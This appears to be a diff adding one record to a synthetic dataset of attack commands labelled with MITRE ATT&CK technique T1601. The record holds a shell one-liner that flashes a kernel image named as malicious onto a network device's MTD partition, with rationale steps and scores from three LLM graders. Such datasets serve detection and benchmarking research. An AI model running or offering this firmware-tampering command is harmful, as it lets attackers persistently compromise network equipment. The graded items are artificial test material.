@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 verify+conditional patch: replace kernel if hash differs'; sha256sum /tmp/mal_kernel.bin | cut -d' ' -f1 > /tmp/mal.sha && dd if=/dev/mtdblock2 bs=1M count=8 2>/dev/null | sha256sum | cut -d' ' -f1 | cmp - /tmp/mal.sha || (flashcp -v /tmp/mal_kernel.bin /dev/mtd2 && sync)",
+  "explanation": "Compares the current kernel partition hash to a malicious image and conditionally flashes the malicious kernel if they differ, ensuring controlled image modification.",
+  "rationale_steps": [
+    "Compute the expected hash of the attacker\u2019s kernel image.",
+    "Hash the on-device kernel partition to detect mismatch.",
+    "If mismatched, flash the malicious kernel to modify the system image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-d6cdd5ca",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators, balanced parentheses, valid redirection operators, and correct piping between commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1601 technique by calculating SHA256 hashes of both a malicious kernel image and the current system kernel, comparing them, and conditionally flashing the malicious kernel if they differ using the appropriate flashcp utility for network devices.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T18:15:44.556282Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced operators, valid commands, and appropriate flag usage throughout the complex pipe and conditional execution.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command's logic and chosen tools are appropriate for comparing and conditionally flashing a kernel, the specified 'Privilege: None' makes the critical operations (reading from MTD block devices and writing with flashcp) fundamentally impossible on any real network device, thus failing to achieve its claimed intent.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T18:16:01.753239Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quotes and grouping, correct pipelines/redirections, and valid options and chaining.",
+        "semantic_score": 4,
+        "semantic_justification": "It conditionally replaces the kernel partition using hash comparison and flashcp, aligning with T1601 on embedded devices, but assumes root privileges and a fixed 8 MiB size which may not universally match.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T18:16:25.917388Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
